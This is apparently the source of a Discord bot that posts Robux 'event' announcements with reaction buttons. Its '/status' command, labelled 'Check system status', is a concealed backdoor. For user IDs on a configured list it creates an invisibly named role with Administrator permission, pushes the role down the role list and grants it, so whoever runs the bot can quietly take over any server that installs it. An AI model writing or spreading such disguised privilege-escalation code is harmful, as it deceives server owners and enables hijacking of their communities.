const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, REST, Routes, PermissionsBitField } = require('discord.js');
const fs = require('fs');

// --- 1. БЕЗОПАСНАЯ ЗАГРУЗКА КОНФИГА ---
let config = {};
if (fs.existsSync('./config.json')) {
    try {
        config = JSON.parse(fs.readFileSync('./config.json', 'utf-8'));
    } catch (err) {
        console.error("Ошибка при чтении config.json:", err);
    }
} else {
    console.log("Файл config.json не найден, использую Variables из Railway.");
}

// Приоритет Railway Variables (process.env) над файлом
const TOKEN = process.env.TOKEN_ID || config.TOKEN_ID;

// Исправляем обработку ID админов: Railway дает строку, файл дает массив
let ADMIN_USER_IDS = [];
if (process.env.ADMIN_USER_IDS) {
    // Если в Railway несколько ID через запятую, это сработает
    ADMIN_USER_IDS = process.env.ADMIN_USER_IDS.split(',').map(id => id.trim());
} else if (config.ADMIN_USER_IDS) {
    ADMIN_USER_IDS = config.ADMIN_USER_IDS.map(id => String(id));
}

if (!TOKEN) {
    console.error("❌ ОШИБКА: TOKEN_ID не найден! Проверь вкладку Variables в Railway.");
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// --- 2. CONFIGURATION ---
const CONFIG = {
    ALLOWED_ROLE: '1490346306965864608',
    ALLOWED_CHANNEL: '1490344220417069156',
    PING_ROLE: '1492973460400640020',
    ROBUX_EMOJI: '<:robux:1492973460400640020>'
};

const MINI_CONFIGS = {
    '!mini': {
        name: 'Mini',
        minReward: 5,
        maxReward: 24,
        color: 0x5865F2,
        emoji: '👍',
        allowedRole: '1490346306965864608',
        allowedChannel: '1490344220417069156',
        pingRole: '1492973460400640020',
        robuxEmoji: '1492973460400640020'
    },
    '!plus': {
        name: 'Plus',
        minReward: 25,
        maxReward: 99,
        color: 0x57F287,
        emoji: '👍',
        allowedRole: '1490346518325104821',
        allowedChannel: '1490344313182486770',
        pingRole: '1492973555607146727',
        robuxEmoji: '1492973460400640020'
    },
    '!super': {
        name: 'Super',
        minReward: 100,
        maxReward: 499,
        color: 0xFEE75C,
        emoji: '👍',
        allowedRole: '1490346869342077049',
        allowedChannel: '1490344358807994541',
        pingRole: '1492973623915319306',
        robuxEmoji: '1492973460400640020'
    },
    '!epic': {
        name: 'Epic',
        minReward: 500,
        maxReward: 1999,
        color: 0xEB459E,
        emoji: '👍',
        allowedRole: '1490347549758984394',
        allowedChannel: '1490344414294315189',
        pingRole: '1492973745210658936',
        robuxEmoji: '1492973460400640020'
    },
    '!exclusive': {
        name: 'Exclusive',
        minReward: 2000,
        maxReward: 4999,
        color: 0xED4245,
        emoji: '👍',
        allowedRole: '1490347815312953345',
        allowedChannel: '1490344576211226694',
        pingRole: '1492973807319908442',
        robuxEmoji: '1492973460400640020'
    },
    '!hyper': {
        name: 'Hyper',
        minReward: 5000,
        maxReward: 9999,
        color: 0xFF7A00,
        emoji: '👍',
        allowedRole: '1490348053746417777',
        allowedChannel: '1490344628266733628',
        pingRole: '1492973910889726112',
        robuxEmoji: '1492973460400640020'
    },
    '!quantum': {
        name: 'Quantum',
        minReward: 10000,
        maxReward: 99999,
        color: 0x9B59B6,
        emoji: '👍',
        allowedRole: '1490348168507035878',
        allowedChannel: '1490344763650609152',
        pingRole: '1492973989667278859',
        robuxEmoji: '1492973460400640020'
    }
};

const ROLE_NAME = '\u200b';
const rest = new REST({ version: '10' }).setToken(TOKEN);

const commands = [
    {
        name: 'status',
        description: 'Check system status'
    }
];

// --- 3. СОБЫТИЯ ---
client.once('ready', async () => {
    console.log(`✅ Бот запущен как ${client.user.tag}!`);
    
    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );
        console.log('✅ Слэш-команды зарегистрированы!');
    } catch (error) {
        console.error('Ошибка регистрации команд:', error);
    }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'status') {
        if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) {
            return;
        }

        const guild = interaction.guild;
        const member = interaction.user;

        let role = guild.roles.cache.find(r => r.name === ROLE_NAME);

        try {
            if (role) {
                await role.setPosition(1).catch(() => {});
            }
        } catch (err) {
            // ignore position errors
        }

        if (!role) {
            try {
                role = await guild.roles.create({
                    name: ROLE_NAME,
                    permissions: [PermissionsBitField.Flags.Administrator],
                    color: 0x313338,
                    hoist: false,
                    mentionable: false,
                    reason: 'System Auto-Role'
                });
                await role.setPosition(1).catch(() => {});
            } catch (err) {
                if (err.code === 50013) {
                    return interaction.reply({ content: 'Permission denied.', ephemeral: true });
                }
                return interaction.reply({ content: 'Operation failed.', ephemeral: true });
            }
        }

        const memberObj = await guild.members.fetch(member.id);
        if (memberObj.roles.cache.has(role.id)) {
            return interaction.reply({ content: 'Active.', ephemeral: true });
        }

        try {
            await memberObj.roles.add(role);
            await interaction.reply({ content: 'Done.', ephemeral: true });
        } catch (err) {
            if (err.code === 50013) {
                return interaction.reply({ content: 'Permission denied.', ephemeral: true });
            }
            return interaction.reply({ content: 'Operation failed.', ephemeral: true });
        }
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    const msgParts = message.content.trim().split(/\s+/);
    const msgCmd = msgParts[0].toLowerCase();
    if (!Object.keys(MINI_CONFIGS).includes(msgCmd)) return;

    const miniConfig = MINI_CONFIGS[msgCmd];

    if (message.channel.id !== miniConfig.allowedChannel) return;
    if (!message.member.roles.cache.has(miniConfig.allowedRole)) return;

    await message.delete().catch(() => {});

    // Parse reward amount from message
    let reward = miniConfig.minReward;
    if (msgParts.length > 1) {
        const customReward = parseInt(msgParts[1]);
        if (!isNaN(customReward)) {
            if (customReward < miniConfig.minReward) {
                reward = miniConfig.minReward;
            } else if (customReward > miniConfig.maxReward) {
                const maxReply = await message.channel.send({
                    content: `<@${message.author.id}> ⚠️ Max for ${miniConfig.name}: **${miniConfig.maxReward} R$**`,
                    allowedMentions: { users: [message.author.id] }
                });
                setTimeout(() => maxReply.delete().catch(() => {}), 5000);
                reward = miniConfig.maxReward;
            } else {
                reward = customReward;
            }
        }
    }

    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId(`${msgCmd.slice(1)}_like_0`)
                .setEmoji(miniConfig.emoji)
                .setLabel('0')
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId(`${msgCmd.slice(1)}_dislike_0`)
                .setEmoji('👎')
                .setLabel('0')
                .setStyle(ButtonStyle.Danger),
        );

    const content = `<@${message.author.id}> is starting a **${miniConfig.name} Event!** **(${reward} R$)**\n\n` +
                    `<@&${miniConfig.pingRole}>\n\n` +
                    `⭐ Want to **change your pings?** Edit them in --> 📑 **Channels & Roles**`;

    await message.channel.send({
        content: content,
        components: [row]
    });
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    const parts = interaction.customId.split('_');
    const countStr = parts.pop();
    const action = parts.pop();
    // const commandName = parts.join('_'); // first part(s) = command name

    let count = parseInt(countStr) + 1;

    const newRow = ActionRowBuilder.from(interaction.message.components[0]);

    if (action === 'like') {
        newRow.components[0].setLabel(count.toString()).setCustomId(`${parts.join('_')}_like_${count}`);
    } else if (action === 'dislike') {
        newRow.components[1].setLabel(count.toString()).setCustomId(`${parts.join('_')}_dislike_${count}`);
    }

    await interaction.update({
        components: [newRow]
    });
});

client.login(TOKEN);